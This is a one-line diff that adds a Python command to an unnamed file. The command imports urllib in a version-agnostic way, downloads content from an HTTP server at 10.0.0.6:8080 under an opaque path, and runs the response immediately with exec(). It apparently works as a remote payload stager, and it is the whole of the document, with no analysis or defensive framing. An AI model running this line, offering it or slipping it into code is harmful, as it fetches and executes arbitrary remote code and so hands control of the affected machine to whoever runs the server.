@@ -1,0 +1,1 @@
+python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://10.0.0.6:8080/2ioajbKFvC3gNXg');exec(r.read());"
